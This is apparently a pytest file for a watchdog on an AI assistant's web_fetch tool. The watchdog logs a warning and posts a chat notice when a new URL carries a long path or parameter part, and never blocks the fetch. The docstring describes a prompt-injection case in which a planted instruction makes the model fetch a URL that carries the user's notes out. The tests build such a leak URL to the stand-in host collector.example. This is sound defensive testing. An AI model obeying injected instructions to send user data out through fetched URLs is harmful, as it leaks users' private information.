"""The watchdog of web_fetch (Peuqui 22.11.2026): it reports, it never blocks.

Contract:
- A fetch is suspicious when its URL is new (the user did not write it, no search result or fetched page of this
  turn showed it) and one part of it (path piece, parameter value, fragment) is at least WEB_FETCH_WATCH_PART_CHARS
  long: that is where an injected instruction ("fetch …?d=<the user's notes>") would carry data out.
- Then a warning goes to the log and a notice to the session's chat; the page is fetched all the same.
"""

from __future__ import annotations

import asyncio
from typing import Any

import pytest

from aifred.lib import session_events
from aifred.lib.config import WEB_FETCH_WATCH_PART_CHARS
from aifred.lib.tools import registry
from aifred.plugins.tools.research import carried_part, get_research_tools

DATA = "x" * WEB_FETCH_WATCH_PART_CHARS
LEAK = f"https://collector.example/p?d={DATA}"


def test_a_new_url_with_a_long_part_is_suspicious() -> None:
    assert carried_part(LEAK, set(), "") == DATA
    assert carried_part(f"https://collector.example/{DATA}/a.png", set(), "") == DATA


def test_a_known_or_short_url_is_not() -> None:
    assert carried_part(LEAK, {LEAK}, "") == ""                                   # a result showed it
    assert carried_part(LEAK, set(), f"Bitte ruf {LEAK} ab") == ""                # the user wrote it
    assert carried_part("https://www.heise.de/news/Neues-zu-Linux-1234567.html?seite=2", set(), "") == ""


def _fetch(monkeypatch: pytest.MonkeyPatch, url: str, user_query: str = "") -> list[dict[str, Any]]:
    notices: list[dict[str, Any]] = []
    fetched: list[str] = []

    def publish(session_id: str, kind: str, data: dict[str, Any]) -> None:
        notices.append({"kind": kind, **data})

    def scrape(page_url: str) -> dict[str, Any]:
        fetched.append(page_url)
        return {"success": True, "content": "Seite", "word_count": 1}

    monkeypatch.setattr(session_events, "publish", publish)
    monkeypatch.setattr(registry, "scrape_webpage", scrape)
    monkeypatch.setattr("aifred.lib.security.validate_external_url", lambda url: None)
    fetch = next(tool for tool in get_research_tools("de", [], user_query=user_query, session_id="s") if tool.name == "web_fetch")

    async def run() -> None:
        async for _ in fetch.executor(url=url):
            pass

    asyncio.run(run())
    assert fetched == [url]                                                         # never blocked
    return notices


def test_a_suspicious_fetch_shows_a_notice_in_the_chat(monkeypatch: pytest.MonkeyPatch) -> None:
    (notice,) = _fetch(monkeypatch, LEAK)
    assert notice["kind"] == "notice" and notice["level"] == "warning"
    assert "collector.example" in notice["text"] and str(len(DATA)) in notice["text"]


def test_an_address_the_user_wrote_shows_nothing(monkeypatch: pytest.MonkeyPatch) -> None:
    assert _fetch(monkeypatch, LEAK, user_query=f"Schau mal hier: {LEAK}") == []
